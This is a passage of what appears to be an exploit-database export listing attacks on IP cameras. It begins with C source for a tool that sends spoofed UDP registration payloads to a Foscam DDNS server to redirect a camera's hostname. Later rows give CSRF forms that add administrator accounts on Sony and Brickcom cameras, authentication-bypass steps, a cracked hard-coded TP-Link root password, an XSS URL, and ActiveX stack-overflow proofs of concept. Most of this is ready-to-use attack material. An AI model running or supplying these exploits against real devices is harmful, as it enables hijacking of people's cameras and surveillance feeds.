0x72, 0x65, 0x65, 0x63, 0x61, 0x6d, 0x01, 0x44, 0x6f, 0x6d, 0x61, 0x69,
0x6e, 0x43, 0x6f, 0x75, 0x6e, 0x74, 0x3d, 0x31, 0x01, 0x44, 0x6f, 0x6d,
0x61, 0x69, 0x6e, 0x30, 0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x2e,
0x6d, 0x79, 0x66, 0x6f, 0x73, 0x63, 0x61, 0x6d, 0x2e, 0x6f, 0x72, 0x67,
0x01, 0x00
static const unsigned int n_initial_payload = 85;
static char redirect_payload[] = {
0x01, 0x50, 0x49, 0x44, 0x3d, 0x31, 0x30, 0x01, 0x55, 0x4e, 0x61, 0x6d,
0x65, 0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x01, 0x50, 0x57, 0x44,
0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x01, 0x4f, 0x45, 0x4d, 0x3d,
0x72, 0x65, 0x65, 0x63, 0x61, 0x6d, 0x01, 0x4f, 0x53, 0x3d, 0x4c, 0x69,
0x6e, 0x75, 0x78, 0x01, 0x42, 0x75, 0x69, 0x6c, 0x64, 0x4e, 0x4f, 0x3d,
0x31, 0x33, 0x38, 0x30, 0x01, 0x44, 0x6f, 0x6d, 0x61, 0x69, 0x6e, 0x30,
0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x2e, 0x6d, 0x79, 0x66, 0x6f,
0x73, 0x63, 0x61, 0x6d, 0x2e, 0x6f, 0x72, 0x67, 0x01, 0x0
static const unsigned int n_redirect_payload = 93;
static int
payload_get_offset_by_name(const char* name, const char buf[0], const unsigned int n_buf)
const unsigned int n_name = strlen(name);
unsigned int i_name = 0;
unsigned int i = 0;
while (i < n_buf) {
while (name[i_name] == buf[i + i_name] && ((i + i_name) < n_buf) && (i_name < n_name))
++i_name;
if (i_name == n_name)
return i;
else
i_name = 0;
++i;
return -1;
static int
payload_insert_host(const char* host, const char* buf, const unsigned int n_buf)
unsigned int i = 0;
unsigned int n_host = strlen(host);
int offset = 0;
while (i < n_host && (buf[++i] != DELIM)) {}
if (i != (UNAME_LEN + 1)) return -1;
if ((offset = payload_get_offset_by_name(KEY_UNAME, buf, n_buf)) == -1) return 1;
memmove((void*) &buf[offset + strlen(KEY_UNAME) + 1], (const void*) host, UNAME_LEN);
if ((offset = payload_get_offset_by_name(KEY_PWD, buf, n_buf)) == -1) return 1;
memmove((void*) &buf[offset + strlen(KEY_PWD) + 1], (const void*) host, UNAME_LEN);
if ((offset = payload_get_offset_by_name(KEY_DOMAIN_0, buf, n_buf)) == -1 || (offset + n_host) >= n_buf) return 1;
memmove((void*) &buf[offset + strlen(KEY_DOMAIN_0) + 1], (const void*) host, n_host);
return 0;
static int
payload_extract_ent_srv_0(const char** ip, unsigned int* n_ip, const char* payload, const unsigned int n_payload)
unsigned int offset = payload_get_offset_by_name(KEY_ENT_SRV_0, payload, n_payload);
const unsigned int n_key_ent_srv = strlen(KEY_ENT_SRV_0);
if (memcmp(&payload[offset], KEY_ENT_SRV_0, n_key_ent_srv) != 0)
return 1;
offset += (n_key_ent_srv + 1); // +1 for '='
unsigned int ip_offset = offset;
while (offset < n_payload && payload[offset] != DELIM)
++offset;
if (offset == n_payload)
return 1;
*ip = &payload[ip_offset];
*n_ip = offset - ip_offset;
return 0;
static int
payload_extract_ent_srv_port(const char** port_fwd, unsigned int* n_port_fwd, const char* payload, const unsigned int
n_payload)
unsigned int offset = payload_get_offset_by_name(KEY_ENT_SRV_MPORT_0, payload, n_payload);
const unsigned int n_key_ent_srv_mport = strlen(KEY_ENT_SRV_MPORT_0);
if (memcmp(&payload[offset], KEY_ENT_SRV_MPORT_0, n_key_ent_srv_mport) != 0)
return 1;
offset += (n_key_ent_srv_mport + 1); // +1 for '='
unsigned int mport_offset = offset;
while (offset < n_payload && payload[offset] != DELIM)
++offset;
if (offset == n_payload)
return 1;
*port_fwd = &payload[mport_offset];
*n_port_fwd = offset - mport_offset;
return 0;
static int
send_udp_payload (const char* payload, const unsigned int n_payload, const char* host, const unsigned short port,
int* sockfd, struct addrinfo** r)
struct addrinfo hints = {0};
struct addrinfo* res = *r;
int ret = 0;
int nbytes = 0;
hints.ai_family = AF_INET;
hints.ai_socktype = SOCK_DGRAM;
if ((ret = getaddrinfo(host, NULL, &hints, &res)) != 0) {
fprintf(stderr, ""getaddrinfo: %s\n"", gai_strerror(ret));
return 1;
if ((*sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol)) == -1) {
fprintf(stderr, ""socket() failed: %s\n"", strerror(errno));
return 1;
struct sockaddr_in *ipv4 = (struct sockaddr_in*) res->ai_addr;
ipv4->sin_port = htons(port);
if ((nbytes = sendto(*sockfd, payload, n_payload, 0, res->ai_addr, sizeof *(res->ai_addr))) != n_payload) {
fprintf(stderr, ""sendto() failed: %s\n"", strerror(errno));
return 1;
*r = res;
return 0;
static void
usage()
fprintf(stdout,
""Tool for packing WebUI firmware.\n""
""Usage: uipack -d <dir> -o <output file>\n""
""\t-s DDNS server name\n""
""\t-a camera hostname\n""
""\t-i IP address to register\n""
""\t-h print this message\n"");
int
main( int argc, char** argv)
if (argc < 4) {
usage();
return 1;
char ddns[MAX_HOSTNAME_LEN] = {0};
char camera_name[MAX_HOSTNAME_LEN] = {0};
char ip[IP_BUF_LEN] = {0};
char o = 0;
while ((o = getopt(argc, argv, "":s:a:i:h"")) != -1) {
switch(o) {
case 's':
if (strlen(optarg) > MAX_HOSTNAME_LEN - 1) {
fprintf(stderr, ""%s can not be longer than %d\n"", optarg, MAX_HOSTNAME_LEN - 1);
return 1;
strncpy(ddns, optarg, MAX_HOSTNAME_LEN);
break;
case 'a':
if (strlen(optarg) > MAX_HOSTNAME_LEN - 1) {
fprintf(stderr, ""%s can not be longer than %d\n"", optarg, MAX_HOSTNAME_LEN - 1);
return 1;
strncpy(camera_name, optarg, MAX_HOSTNAME_LEN);
break;
case 'i':
if (strlen(optarg) > IP_BUF_LEN - 1) {
fprintf(stderr, ""%s can not be longer than %d\n"", optarg, IP_BUF_LEN - 1);
return 1;
strncpy(ip, optarg, IP_BUF_LEN);
break;
case 'h':
usage();
return 0;
case '?':
fprintf(stderr, ""Illegal option -%c\n"", optopt);
usage();
return 1;
defalt:
fprintf(stderr, ""Option -%c requires an argument.\n"", optopt);
usage();
return 1;
if (strlen(ddns) == 0|| strlen(camera_name) == 0 || strlen(ip) == 0) {
usage();
return 1;
if (payload_insert_host(camera_name, initial_payload, n_initial_payload) != 0) {
fprintf(stderr, ""Could not insert hostname into the payload"");
return 1;
int sockfd = 0;
struct addrinfo* res = NULL;
if (send_udp_payload (initial_payload, n_initial_payload, ddns, 8080, &sockfd, &res) != 0) {
fprintf(stderr, ""Could not send UDP payload to %s"", ddns);
return 1;
char resp[RESP_BUF_LEN] = {0};
int n_resp;
unsigned int fromlen = sizeof *(res->ai_addr);
if ((n_resp = recvfrom(sockfd, resp, RESP_BUF_LEN, 0, res->ai_addr, &fromlen)) == -1) {
fprintf(stderr, ""recvfrom() failed: %s\n"", strerror(errno));
return 1;
fprintf(stderr, ""Got %d bytes\n"", n_resp);
freeaddrinfo(res);
const char* ip_fwd = NULL;
unsigned int n_ip_fwd = 0;;
char str_ip_fwd[IP_BUF_LEN] = {0};
if (payload_extract_ent_srv_0(&ip_fwd, &n_ip_fwd, resp, n_resp) != 0) {
fprintf(stderr, ""Could not extract IP server from the response\n"");
return 1;
memmove(str_ip_fwd, ip_fwd, n_ip_fwd);
fprintf(stderr, ""IP of the redirect server is: %s\n"", str_ip_fwd);
const char* port_fwd = 0;
unsigned int n_port_fwd = 0;
char str_port_fwd[PORT_BUF_LEN] = {0};
if (payload_extract_ent_srv_port(&port_fwd, &n_port_fwd, resp, n_resp) != 0) {
fprintf(stderr, ""Could not extract port from the response\n"");
return 1;
memmove(str_port_fwd, port_fwd, n_port_fwd);
fprintf(stderr, ""Port of the redirect server is: %s\n"", str_port_fwd);
if (payload_insert_host(camera_name, redirect_payload, n_redirect_payload) != 0) {
fprintf(stderr, ""Could not insert hostname into the redirect payload"");
return 1;
sockfd = 0;
res = NULL;
if (send_udp_payload(redirect_payload, n_redirect_payload, str_ip_fwd, atoi(str_port_fwd), &sockfd, &res) != 0) {
fprintf(stderr, ""Could not send UDP payload to %s"", str_ip_fwd);
return 1;
return 0;"
2013-06-12,Remote,Hardware,Castillo,Grandstream Multiple IP Cameras,Cross-Site Request Forgery,"source: https://www.securityfocus.com/bid/60532/info
http://www.example.com/goform/usermanage?cmd=add&user.name=test3&user.password=test3&user.level=0","Grandstream multiple IP cameras including GXV3501, GXV3504, GXV3601, GXV3601HD/LL, GXV3611HD/LL, GXV3615W/P, GXV3651FHD, GXV3662HD, GXV3615WP_HD, and GXV3500 are prone to a cross-site request-forgery vulnerability.
Exploiting this issue may allow a remote attacker to perform certain unauthorized actions. This may lead to further attacks."
2013-06-12,Remote,Hardware,Castillo,Sony CH / DH Series IP Cameras,Multiple Cross-Site Request Forgery Vulnerabilities,source: https://www.securityfocus.com/bid/60529/info,"Sony CH and DH series IP cameras including SNCCH140, SNCCH180, SNCCH240, SNCCH280, SNCDH140, SNCDH140T, SNCDH180, SNCDH240, SNCDH240T, and SNCDH280 are prone to multiple cross-site request-forgery vulnerabilities.
Exploiting these issues may allow a remote attacker to perform certain unauthorized actions. This may lead to further attacks.
<html>
<body>
<form name=""SonyCsRf"" action=""http://xx.xx.xx.xx/command/user.cgi"" method=""POST"">
<input type=""Select"" name=""ViewerModeDefault"" value=""00000fff"">
<input type=""Hidden"" name=""ViewerAuthen"" value=""off"">
<input type=""Hidden"" name=""Administrator"" value=""YWRtaW46YWRtaW4="">
<input type=""Hidden"" name=""User1"" value=""xxxx,c0000fff"">
<input type=""Hidden"" name=""User2"" value=""xxxx,c0000fff"">
<input type=""Hidden"" name=""User3"" value=""dG1wdG1wOnRtcHRtcA==,c0000fff"">
<input type=""Hidden"" name=""User4"" value=""Og==,00000fff"">
<input type=""Hidden"" name=""User5"" value=""Og==,00000fff"">
<input type=""Hidden"" name=""User6"" value=""Og==,00000fff"">
<input type=""Hidden"" name=""User7"" value=""Og==,00000fff"">
<input type=""Hidden"" name=""User8"" value=""Og==,00000fff"">
<input type=""Hidden"" name=""User9"" value=""Og==,00000fff"">
<input type=""Hidden"" name=""Reload"" value=""referer"">
<script>document.SonyCsRf.submit();</script>
</form>
</body>
</html>"
2013-06-12,Remote,Hardware,Castillo,Brickcom Multiple IP Cameras,Cross-Site Request Forgery,source: https://www.securityfocus.com/bid/60526/info,"Brickcom multiple IP cameras are prone to a cross-site request-forgery vulnerability.
Exploiting this issue may allow a remote attacker to perform certain unauthorized actions and gain access to the affected application. Other attacks are also possible.
Brickcom cameras running firmware 3.0.6.7, 3.0.6.12, and 3.0.6.16C1 are vulnerable; other versions may also be affected.
<html>
<body>
<form name=""gobap"" action=""http://xx.xx.xx.xx/cgi-bin/users.cgi""; method=""POST"">
<input type=""hidden"" name=""action"" value=""add"">
<input type=""hidden"" name=""index"" value=""0"">
<input type=""hidden"" name=""username"" value=""test2"">
<input type=""hidden"" name=""password"" value=""test2"">
<input type=""hidden"" name=""privilege"" value=""1"">
<script>document.gobap.submit();</script>
</form>
</body>
</html>"
2013-04-09,Remote,Hardware,shekyan,Foscam IP (Multiple Cameras),Multiple Cross-Site Request Forgery Vulnerabilities,"source: https://www.securityfocus.com/bid/58943/info
http://www.example.com/set_users.cgi?user1=&pwd1=&pri1=2&user2=&pwd2=&pri2=&user3=&pwd3=&pri3=&user4=&pwd4=&pri4=&user5=&pwd5=&pri5=&user6=&pwd6=&pri6=&user7=&pwd7=&pri7=&user8=csrf&pwd8=csrf&pri8=2&next_url=","Multiple Foscam IP Cameras are prone to multiple cross-site request-forgery vulnerabilities.
Exploiting these issues may allow a remote attacker to perform certain unauthorized actions. This may lead to further attacks.
The following products are vulnerable:
Foscam FI8910W running Embedded Web Interface 2.4.10.3
Foscam FI8908W running Embedded Web Interface 2.4.10.3"
2015-09-20,WebApps,Hardware,Orwelllabs,ADH-Web Server IP-Cameras,Multiple Vulnerabilities,"http://target_ip/variable.cgi?variable=dhcp_dns&slaveip=0.0.0.0
http://target_ip/variable.cgi?variable=console_master_ftpuser&slaveip=0.0.0.0
http://target_ip/variable.cgi?variable=console_master_ftppass&slaveip=0.0.0.0
http://target_ip/variable.cgi?variable=alarm_title&slaveip=0.0.0.0
http://target_ip/variable.cgi?variable=camconfig[0]&slaveip=127.0.0.1","1. Adivisory Information
Title: ADH-Web Server IP-Cameras Improper Access Restrictions
EDB-ID: 38245
Advisory ID: OLSA-2015-0919
Advisory URL: http://www.orwelllabs.com/2015/10/adh-web-server-ip-cameras-improper.html
Date published: 2015-09-19
Date of last update: 2016-02-15
Vendors contacted: Dedicated Micros
2. Vulnerability Information
Class: Information Exposure [CWE-200]
Impact: Access Control Bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: N/A
3. Vulnerability Description
Due to improper access restriction the ADH-Web device [1] allows a remote attacker to browse and access arbitrary files from the following directorie '/hdd0/logs'. You can also get numerous information (important for a fingerprint step) via the parameter variable in variable.cgi script [2].
Background:
Dedicated Micros’ ground breaking Closed IPTV solution makes deploying an IP Video, CCTV system safe, secure and simple. Combining patent-pending innovation with zeroconf networking technology, Closed IPTV automatically allocates IP addresses to IP cameras by physical port. In this way the system is completely deterministic, creating firewalls and monitoring IP connections by individual network ports so they cannot be hacked or intercepted. This ground breaking solution provides a very simple and secure answer to IP Video, meaning that no prior knowledge of IP networking is required. Sophisticated and Dependable network security can be achieved with a single click.
4. Vulnerable Packages
- SD Advanced Closed IPTV
- SD Advanced
- EcoSense
- Digital Sprite 2
5. Technical Description
[1] Usually this directory can be protected against unauthenticated access (401 Unauthorized), though, it can access all files directly without requiring authentication.As in the statement below:
(401):  http://<target_ip>/hdd0/logs
(200): http://<target_ip>/hdd0/logs/log.txt
> Most common logfiles:
arc_log.txt
bak.txt
connect.txt
log.txt
seclog.log
startup.txt
DBGLOG.TXT
access.txt
security.txt
[2] Another problem identified is an information exposure via the parameter variable in variable.cgi script. Knowing some variables can extract a reasonable amount of information:
> DNS:
> ftp master ftp console credentials:
(although the vast majority of servers have ftp/telnet with anonymous access allowed.)
> alms
> camconfig
(includes, but is not limited to)
This servers also sends credentials (and other sensitive data) via GET parameters, this is poor practice as the URL is liable to be logged in any number of places between the customer and the camera. The credentials should be passed in the body of a POST request (under SSL of course, here is not the case). .  (Is possible to create, edit and delete users and other configurations in this way, very dangerous CSRF vectors).
6. Vendor Information, Solutions and Workarounds
The vendor found that some things are not vulnerabilities (sensitive information via GET, for example) and others are useless (hardcoded credentials) and others are not yet so critical (access to server logs).  I think that at least this information can assist during an intrusion test, as will be shown soon.
7. Credits
These vulnerabilities has been discovered by Orwelllabs.
8. Report Timeline
2015-08-31: Vendor has been notified about the vulnerabilities (without details yet).
2015-09-01: Vendor acknowledges the receipt of the email and asks for technical details.
2015-09-01: A email with technical details is sent to vendor.
2015-09-11: Still no response, another email was sent to the Vendor requesting any opinion on the reported problems.
2015-09-11: The vendor reported that the matter was passed on to the team developed and that it would contact me the following week (2015-09-14).
2015-09-14: The development team responded by passing its consideration of the points andreported in accordance with this response the impact of these vulnerabilities is low and are no longer available unauthenticated using recent software release (version 10212).
Legal Notices
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
I accept no responsibility for any damage caused by the use or misuse of this information.
About Orwelllabs
Orwelllabs is a security research lab interested in embedded device & webapp hacking.
We aims to create some intelligence around this vast and confusing picture that is the Internet of things.
-----BEGIN PGP PUBLIC KEY BLOCK-----
mQENBFcJl8wBCAC/J8rAQdOoC82gik6LVbH674HnxAAQ6rBdELkyR2S2g1zMIAFt
xNN//A3bUWwFtlrfgiJkiOC86FimPus5O/c4iZc8klm07hxWuzoLPzBPM50+uGKH
xZwwLa5PLuuR1T0O+OFqd9sdltz6djaYrFsdq6DZHVrp31P7LqHHRVwN8vzqWmSf
55hDGNTrjbnmfuAgQDrjA6FA2i6AWSTXEuDd5NjCN8jCorCczDeLXTY5HuJDb2GY
U9H5kjbgX/n3/UvQpUOEQ5JgW1QoqidP8ZwsMcK5pCtr9Ocm+MWEN2tuRcQq3y5I
SRuBk/FPhVVnx5ZrLveClCgefYdqqHi9owUTABEBAAG0IU9yd2VsbExhYnMgPG9y
d2VsbGxhYnNAZ21haWwuY29tPokBOQQTAQgAIwUCVwmXzAIbAwcLCQgHAwIBBhUI
AgkKCwQWAgMBAh4BAheAAAoJELs081R5pszAhGoIALxa6tCCUoQeksHfR5ixEHhA
Zrx+i3ZopI2ZqQyxKwbnqXP87lagjSaZUk4/NkB/rWMe5ed4bHLROf0PAOYAQstE
f5Nx2tjK7uKOw+SrnnFP08MGBQqJDu8rFmfjBsX2nIo2BgowfFC5XfDl+41cMy9n
pVVK9qHDp9aBSd3gMc90nalSQTI/QwZ6ywvg+5/mG2iidSsePlfg5d+BzQoc6SpW
LUTJY0RBS0Gsg88XihT58wnX3KhucxVx9RnhainuhH23tPdfPkuEDQqEM/hTVlmN
95rV1waD4+86IWG3Zvx79kbBnctD/e9KGvaeB47mvNPJ3L3r1/tT3AQE+Vv1q965
AQ0EVwmXzAEIAKgsUvquy3q8gZ6/t6J+VR7ed8QxZ7z7LauHvqajpipFV83PnVWf
ulaAIazUyy1XWn80bVnQ227fOJj5VqscfnHqBvXnYNjGLCNMRix5kjD/gJ/0pm0U
gqcrowSUFSJNTGk5b7Axdpz4ZyZFzXc33R4Wvkg/SAvLleU40S2wayCX+QpwxlMm
tnBExzgetRyNN5XENATfr87CSuAaS/CGfpV5reSoX1uOkALaQjjM2ADkuUWDp6KK
6L90h8vFLUCs+++ITWU9TA1FZxqTl6n/OnyC0ufUmvI4hIuQV3nxwFnBj1Q/sxHc
TbVSFcGqz2U8W9ka3sFuTQrkPIycfoOAbg0AEQEAAYkBHwQYAQgACQUCVwmXzAIb
DAAKCRC7NPNUeabMwLE8B/91F99flUVEpHdvy632H6lt2WTrtPl4ELUy04jsKC30
MDnsfEjXDYMk1GCqmXwJnztwEnTP17YO8N7/EY4xTgpQxUwjlpah++51JfXO58Sf
Os5lBcar8e82m1u7NaCN2EKGNEaNC1EbgUw78ylHU3B0Bb/frKQCEd60/Bkv0h4q
FoPujMQr0anKWJCz5NILOShdeOWXIjBWxikhXFOUgsUBYgJjCh2b9SqwQ2UXjFsU
I0gn7SsgP0uDV7spWv/ef90JYPpAQ4/tEK6ew8yYTJ/omudsGLt4vl565ArKcGwB
C0O2PBppCrHnjzck1xxVdHZFyIgWiiAmRyV83CiOfg37
=IZYl
-----END PGP PUBLIC KEY BLOCK-----"
2015-09-15,Remote,Hardware,LiquidWorm,TP-Link NC200/NC220 Cloud Camera 300Mbps Wi-Fi,Hard-Coded Credentials,"Summary: Designed with simplicity in mind, TP-LINK's Cloud Cameras are a
Desc: NC220 and NC200 utilizes hard-coded credentials within its Linux","TP-Link NC200/NC220 Cloud Camera 300Mbps Wi-Fi Hard-Coded Credentials
Vendor: TP-LINK Technologies Co., Ltd.
Product web page: http://www.tp-link.us
Affected version: NC220 V1 1.0.28 Build 150629 Rel.22346
NC200 V1 2.0.15 Build 150701 Rel.20962
fast and trouble free way to keep track on what's going on in and around
your home. Video monitoring, recording and sharing has never been easier
with the use of TP-LINK’s Cloud service. The excitement of possibilities
never end.
distribution image. These sets of credentials (root:root) are never exposed
to the end-user and cannot be changed through any normal operation of the
camera.
Tested on: Linux
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2015-5255
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5255.php
20.07.2015
Initializing...
root@zslab:~# strings NC220_1.0.28_Build_150629_Rel.22346.bin |grep root
root_uImage
p2048_newroot.cer
root:$1$gt7/dy0B$6hipR95uckYG1cQPXJB.H.:0:0:Linux User,,,:/home/root:bin/sh
Nproot:x:0:
root@zslab:~# strings NC220_1.0.28_Build_150629_Rel.22346.bin | grep home > crack.me
root@zslab:~# john crack.me
Loaded 1 password hash (FreeBSD MD5 [128/128 SSE2 intrinsics 12x])
root             (root)
guesses: 1  time: 0:00:00:00 DONE (Mon Aug  3 05:52:55 2015)  c/s: 400  trying:
root - Userroot
Use the ""--show"" option to display all of the cracked passwords reliably
root@zslab:~# john crack.me --show
root:root:0:0:Linux User,,,:/home/root:/bin/sh
1 password hash cracked, 0 left
root@zslab:~#"
2015-08-25,WebApps,Hardware,RAT - ThiefKing,Keeper IP Camera 3.2.2.10,Authentication Bypass,"# Exploit Title: Keeper IP Camera - Authentication Bypass
# Date: 25/08/2015
# Exploit Author: RAT - ThiefKing
# Vendor Homepage: http://www.keeper.cn/en/Camera-ip.asp
# Version: 3.2.2.10
# WEB Version: 6.1.17.192
# Tested on: QB200W, QB130W, QA130W,...
http://tromcap.com","Exploit:
1 - First, open your browser
2 - Enter the IP address or domain to see the login screen of the camera
3 - Now go to page umanage.asp (http://ipaddress:port/umanage.asp)
You can change or view passwords
TEST: http://server:88/login.asp
RAT - ThiefKing"
2015-08-15,WebApps,Hardware,Meisam Monsef,Security IP Camera Star Vision DVR,Authentication Bypass,"# Exploit Title: Security IP Camera Star Vision DVR Authentication Bypass
# Date: 2015-08-13
# Exploit Author: Meisam Monsef meisamrce@yahoo.com or meisamrce@gmail.com
# Vendor Homepage: #
# Version: All Versions","Exploit :
1 - First, open your Chrome browser
2 - Enter the IP address or domain to see the login screen of the camera
3 - Press the F12 key to open the browser console
4 - Click the Console tab and enter the following code
login_set(1,1,1,1);
5 - Now go to page view2.html
6 - enjoy seeing camera :)
Test : http://m.2.is/
Video Tutorial : http://s3.picofile.com/file/8206365584/cam.mp4.html"
2012-02-10,Remote,Hardware,console-cowboys,Trendnet Camera (Multiple Products),Remote Security Bypass,"source: https://www.securityfocus.com/bid/51922/info
http://www.example.com/anony/mjpg.cgi","Multiple Trendnet Camera products are prone to a remote security-bypass vulnerability.
Successfully exploiting this issue will allow remote attackers to gain access to a live stream from the camera."
2011-12-07,Remote,Hardware,Matt Metzger,Axis M10 Series Network Cameras,Cross-Site Scripting,"source: https://www.securityfocus.com/bid/50968/info
http://www.example.com/admin/showReport.shtml?content=serverreport.cgi&pageTitle=%3C%2Ftitle%3E%3Cscript%3Ealert(String.fromCharCode(88%2C83%2C83))%3B%3C%2Fscript%3E%3Ctitle%3E","Axis M10 Series Network Cameras are prone to a cross-site scripting vulnerability because they fail to sufficiently sanitize user-supplied data.
An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
Axis M1054 firmware 5.21 is vulnerable; other version may also be affected."
2011-05-25,Remote,Hardware,Spare Clock Cycles,RXS-3211 IP Camera,UDP Packet Password Information Disclosure,source: https://www.securityfocus.com/bid/47976/info,"The RXS-3211 IP camera is prone to an information-disclosure vulnerability.
Successful exploits will allow a remote attacker to gain access to sensitive information. Information obtained will aid in further attacks.
the following proof of concept is available:
\xff\xff\xff\xff\xff\xff\x00\x06\xff\xf9"
2014-12-02,Remote,Hardware,LiquidWorm,IPUX CS7522/CS2330/CS2030 IP Camera,'UltraHVCamX.ocx' ActiveX Stack Buffer Overflow,"Summary: The device is H.264 Wired/Wireless IP Camera with 1.3 Mega-pixel sensor.
Desc: The UltraHVCam ActiveX Control 'UltraHVCamX.ocx' suffers from a stack buffer","﻿
IPUX CS7522/CS2330/CS2030 IP Camera (UltraHVCamX.ocx) ActiveX Stack Buffer Overflow
Vendor: Big Good Holdings Limited | Fitivision Technology Inc.
Product web page: http://www.ipux.net | http://www.fitivision.com
Affected version: PT Type ICS2330 (firmware: ICS2330 1.1.0-29 20140120 r4296)
Cube Type ICS2030 (firmware: ICS2030 1.1.0-21 20130223 r3967)
Dome Type ICS7522 (firmware: ICS7522 1.1.0-7 20120413 r3812)
With high performance H.264 video compression, the file size of video stream is
extremely reduced, as to optimize the network bandwidth efficiency. It has full
Pan/Tilt function and 3X digital zoom feature for a larger space monitoring. The
built-in USB port provides a convenient and portable storage option for local storage
of event and schedule recording, especially network disconnected.
overflow vulnerability when parsing large amount of bytes to several functions in
UltraHVCamLib, resulting in memory corruption overwriting several registers including
the SEH. An attacker can gain access to the system of the affected node and execute
arbitrary code.
(4b24.478c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\Downloaded Program Files\UltraHVCamX.ocx -
eax=02d04d4f ebx=001dc890 ecx=41414141 edx=41414141 esi=001d6d6c edi=00000009
eip=10032459 esp=0030efe8 ebp=0030efec iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
UltraHVCamX!DllUnregisterServer+0x100e9:
10032459 8b12            mov     edx,dword ptr [edx]  ds:002b:41414141=????????
0:000> d ecx
41414141  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
41414151  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
41414161  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
41414171  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
41414181  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
41414191  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
414141a1  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
414141b1  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
0:000> d eax
02d04d4f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
02d04d5f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
02d04d6f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
02d04d7f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
02d04d8f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
02d04d9f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
02d04daf  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
02d04dbf  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
Tested on: Microsoft Windows 7 Professional SP1 (EN)
Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2014-5212
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5212.php
16.11.2014
Properties:
FileDescriptionUltraHVCam ActiveX Control
FileVersion1, 0, 52, 55 and 1, 0, 52, 54
InternalNameUltraHVCamX
OriginalFileNameUltraHVCamX.ocx
ProductNameUltraHVCam device ActiveX Control
ProductVersion1, 0, 52, 55 and 1, 0, 52, 54
List of members:
Interface IUltraHVCamX : IDispatch
Default Interface: True
Members : 66
RemoteHost
RemotePort
AccountCode
GetConfigValue
SetConfigValue
SetCGIAPNAME
Password
UserName
fChgImageSize
ImgWidth
ImgHeight
SnapFileName
AVIRecStart
SetImgScale
OpenFolder
OpenFileDlg
TriggerStatus
AVIRecStatus
Event_Frame
PlayVideo
SetAutoScale
Event_Signal
WavPlay
CGI_ParamGet
CGI_ParamSet
MulticastEnable
MulticastStatus
SetPTUserAllow
SetLanguage
SetZoomButtonFontColor
SetZoomButtonColor
SetFullScreen
Vulnerable members of the class:
RemoteHost
AccountCode
SetCGIAPNAME
Password
UserName
SnapFileName
OpenFolder
CGI_ParamGet
CGI_ParamSet
MulticastEnable
PoC(s):
---1
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Function MulticastEnable ( ByVal sIP As String ,  ByVal lPort As Long ) As Long""
memberName = ""MulticastEnable""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 2
arg1=String(13332, ""A"")
arg2=1
target.MulticastEnable arg1 ,arg2
</script>
</html>
---2
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Property Let RemoteHost As String""
memberName = ""RemoteHost""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 1
arg1=String(2068, ""A"")
target.RemoteHost = arg1
</script>
</html>
---3
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Property Let AccountCode As String""
memberName = ""AccountCode""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 1
arg1=String(1044, ""A"")
target.AccountCode = arg1
</script>
</html>
---4
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Property Let SetCGIAPNAME As String""
